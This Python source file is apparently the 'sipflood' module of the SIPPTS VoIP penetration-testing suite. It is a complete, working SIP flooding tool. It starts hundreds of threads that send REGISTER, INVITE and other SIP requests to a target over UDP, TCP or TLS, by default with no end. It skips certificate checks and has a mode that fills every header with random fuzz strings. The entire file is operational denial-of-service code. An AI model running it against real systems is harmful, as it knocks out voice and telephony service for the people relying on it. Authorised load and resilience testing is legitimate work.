#!/usr/bin/env python3
# -*- coding: utf-8 -*-

__author__ = "Jose Luis Verdeguer"
__version__ = "4.1"
__license__ = "GPL"
__copyright__ = "Copyright (C) 2015-2024, SIPPTS"
__email__ = "pepeluxx@gmail.com"

import os
import socket
import signal
import sys
import ssl
import fcntl
import threading
import time
from .lib.color import Color
from .lib.functions import (
    create_message,
    get_free_port,
    generate_random_integer,
    generate_random_string,
)
from .lib.logos import Logo


class SipFlood:
    def __init__(self):
        self.ip = ""
        self.host = ""
        self.proxy = ""
        self.route = ""
        self.rport = "5060"
        self.proto = "UDP"
        self.method = ""
        self.domain = ""
        self.contact_domain = ""
        self.from_user = "100"
        self.from_name = ""
        self.from_domain = ""
        self.to_user = "100"
        self.to_name = ""
        self.to_domain = ""
        self.user_agent = "pplsip"
        self.digest = ""
        self.verbose = 0
        self.nthreads = "300"
        self.count = 0
        self.number = 0
        self.bad = 0
        self.supported_methods = []

        self.alphabet = "printable"
        self.min = 0
        self.max = 1000

        self.c = Color()

        self.run = True

    def start(self):
        supported_protos = ["UDP", "TCP", "TLS"]
        self.supported_methods = [
            "REGISTER",
            "SUBSCRIBE",
            "NOTIFY",
            "PUBLISH",
            "MESSAGE",
            "INVITE",
            "OPTIONS",
            "ACK",
            "CANCEL",
            "BYE",
            "PRACK",
            "INFO",
            "REFER",
            "UPDATE",
        ]

        try:
            self.verbose == int(self.verbose)
        except:
            self.verbose = 0

        try:
            self.bad == int(self.bad)
        except:
            self.bad = 0

        if self.bad:
            self.supported_methods.append("FUZZ")

        self.method = self.method.upper()
        self.proto = self.proto.upper()

        # if rport is by default but we want to scan TLS protocol, use port 5061
        if self.rport == 5060 and self.proto == "TLS":
            self.rport = 5061

        # check method
        if not self.bad and self.method == "":
            print(f"{self.c.BRED}Method is mandatory")
            print(self.c.WHITE)
            sys.exit()
        if not self.bad and self.method not in self.supported_methods:
            print(f"{self.c.BRED}Method {self.method} is not supported")
            print(self.c.WHITE)
            sys.exit()

        # check protocol
        if self.proto not in supported_protos:
            print(f"{self.c.BRED}Protocol {self.proto} is not supported")
            print(self.c.WHITE)
            sys.exit()

        logo = Logo("sipflood")
        logo.print()

        signal.signal(signal.SIGINT, self.signal_handler)
        print(f"{self.c.BYELLOW}\nPress Ctrl+C to stop\n")
        print(self.c.WHITE)

        print(
            f"{self.c.BWHITE}[✓] Target: {self.c.GREEN}{self.ip}{self.c.WHITE}:{self.c.GREEN}{self.rport}{self.c.WHITE}/{self.c.GREEN}{self.proto}"
        )
        if self.proxy != "":
            print(f"{self.c.BWHITE}[✓] Outbound Proxy: {self.c.GREEN}{self.proxy}")
        print(f"{self.c.BWHITE}[✓] Method: {self.c.GREEN}{self.method}")
        print(f"{self.c.BWHITE}[✓] Used threads: {self.c.GREEN}{self.nthreads}")

        if self.number == 0:
            print(f"{self.c.BWHITE}[✓] Number of requests: {self.c.GREEN}INFINITE")
        else:
            print(f"{self.c.BWHITE}[✓] Number of requests: {self.c.GREEN}{self.number}")

        if self.bad:
            print(f"{self.c.BWHITE}[✓] Alphabet: {self.c.GREEN}{self.alphabet}")
            print(f"{self.c.BWHITE}[✓] Min length: {self.c.GREEN}{str(self.min)}")
            print(f"{self.c.BWHITE}[✓] Max length: {self.c.GREEN}{str(self.max)}")
        print(self.c.WHITE)

        threads = list()

        for i in range(int(self.nthreads)):
            if self.run == True:
                t = threading.Thread(target=self.flood, daemon=True)
                threads.append(t)
                t.start()
                # time.sleep(0.1)

        for i, t in enumerate(threads):
            t.join()
            print(
                f"{self.c.BYELLOW}\n[!] Thread {str(i+1)} closed ...{self.c.WHITE}",
                end="\r",
            )

        print(
            f"{self.c.YELLOW}\n\n[+] Sent {self.c.BGREEN}{str(self.count)}{self.c.YELLOW} messages{self.c.WHITE}"
        )
        print(self.c.WHITE)

    def signal_handler(self, sig, frame):
        self.stop()

    def stop(self):
        self.run = False
        time.sleep(0.1)
        print(f"{self.c.BYELLOW}\nYou pressed Ctrl+C!")
        print(f"{self.c.BWHITE}\nStopping flood ... wait a moment\n")
        print(self.c.WHITE)

    def flood(self):
        while self.run == True and (self.count <= self.number or self.number == 0):
            try:
                if self.proto == "UDP":
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                else:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            except socket.error:
                print(f"{self.c.RED}Failed to create socket")
                print(self.c.WHITE)
                sys.exit(1)
            fcntl.fcntl(sock, fcntl.F_SETFL, os.O_NONBLOCK)

            bind = "0.0.0.0"

            if self.proxy == "":
                host = (str(self.ip), int(self.rport))
            else:
                if self.proxy.find(":") > 0:
                    (proxy_ip, proxy_port) = self.proxy.split(":")
                else:
                    proxy_ip = self.proxy
                    proxy_port = "5060"

                host = (str(proxy_ip), int(proxy_port))

            try:
                lport = get_free_port()
                sock.bind((bind, lport))

                if not self.bad:
                    if self.host != "" and self.domain == "":
                        self.domain = self.host
                    if self.domain == "":
                        self.domain = self.ip
                    if not self.from_domain or self.from_domain == "":
                        self.from_domain = self.domain
                    if not self.to_domain or self.to_domain == "":
                        self.to_domain = self.domain

                    if self.contact_domain == "":
                        self.contact_domain = "10.0.0.1"

                    if self.proxy != "":
                        self.route = "<sip:%s;lr>" % self.proxy

                    msg = create_message(
                        self.method,
                        "",
                        self.contact_domain,
                        self.from_user,
                        self.from_name,
                        self.from_domain,
                        self.to_user,
                        self.to_name,
                        self.to_domain,
                        self.proto,
                        self.domain,
                        self.user_agent,
                        lport,
                        "",
                        "",
                        "",
                        "1",
                        "",
                        self.digest,
                        1,
                        "",
                        0,
                        "",
                        self.route,
                        "",
                        "",
                        "",
                        1,
                    )

                    method_label = self.method

                try:
                    sock.settimeout(1)

                    if self.proto == "TCP":
                        sock.connect(host)

                    if self.proto == "TLS":
                        context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                        context.check_hostname = False
                        context.verify_mode = ssl.CERT_NONE
                        context.load_default_certs()

                        sock_ssl = context.wrap_socket(
                            sock, server_hostname=str(host[0])
                        )
                        sock_ssl.connect(host)
                except:
                    # print(f"{self.c.RED}\nSocket connection error\n{self.c.WHITE}")
                    pass

                try:
                    if self.bad:
                        if not self.method or self.method == "":
                            method = self.supported_methods[
                                generate_random_integer(0, 13)
                            ]
                            if method == "FUZZ":
                                method = generate_random_string(
                                    self.min, self.max, self.alphabet
                                )
                        else:
                            method = self.method

                        method_label = method

                        contactdomain = generate_random_string(
                            self.min, self.max, self.alphabet
                        )
                        fromuser = generate_random_string(
                            self.min, self.max, self.alphabet
                        )
                        fromname = generate_random_string(
                            self.min, self.max, self.alphabet
                        )
                        fromdomain = generate_random_string(
                            self.min, self.max, self.alphabet
                        )
                        touser = generate_random_string(
                            self.min, self.max, self.alphabet
                        )
                        toname = generate_random_string(
                            self.min, self.max, self.alphabet
                        )
                        todomain = generate_random_string(
                            self.min, self.max, self.alphabet
                        )
                        proto = generate_random_string(
                            self.min, self.max, self.alphabet
                        )
                        domain = generate_random_string(
                            self.min, self.max, self.alphabet
                        )
                        useragent = generate_random_string(
                            self.min, self.max, self.alphabet
                        )
                        fromport = generate_random_integer(self.min, self.max)
                        branch = generate_random_string(
                            self.min, self.max, self.alphabet
                        )
                        callid = generate_random_string(
                            self.min, self.max, self.alphabet
                        )
                        tag = generate_random_string(self.min, self.max, self.alphabet)
                        cseq = generate_random_string(self.min, self.max, self.alphabet)
                        totag = generate_random_string(
                            self.min, self.max, self.alphabet
                        )
                        digest = generate_random_string(
                            self.min, self.max, self.alphabet
                        )
                        auth_type = generate_random_integer(1, 2)
                        referto = generate_random_string(
                            self.min, self.max, self.alphabet
                        )
                        withsdp = generate_random_integer(1, 2)
                        via = generate_random_string(self.min, self.max, self.alphabet)
                        if self.route == "":
                            rr = generate_random_string(
                                self.min, self.max, self.alphabet
                            )
                        else:
                            rr = self.route

                        msg = create_message(
                            method,
                            "",
                            contactdomain,
                            fromuser,
                            fromname,
                            fromdomain,
                            touser,
                            toname,
                            todomain,
                            proto,
                            domain,
                            useragent,
                            fromport,
                            branch,
                            callid,
                            tag,
                            cseq,
                            totag,
                            digest,
                            auth_type,
                            referto,
                            withsdp,
                            via,
                            rr,
                            "",
                            "",
                            "",
                            1,
                        )

                    if self.verbose == 1:
                        print(
                            f"{self.c.BWHITE}[+] Sending {method_label} to {self.ip}:{self.rport} ..."
                        )
                        print(f"{self.c.YELLOW}{msg}")
                    else:
                        print(
                            f"{self.c.BYELLOW}[{str(self.count)}] Sending {method_label} to {self.ip}:{self.rport}/{self.proto}{' '.ljust(100)} ...",
                            end="\r",
                        )

                    if self.proto == "TLS":
                        sock_ssl.sendall(bytes(msg[:8192], "utf-8"))
                    else:
                        sock.sendto(bytes(msg[:8192], "utf-8"), host)

                    self.count += 1
                except socket.timeout:
                    pass
                except:
                    pass
            except:
                pass

            sock.close()

        try:
            sock.close()
        except:
            pass

        return
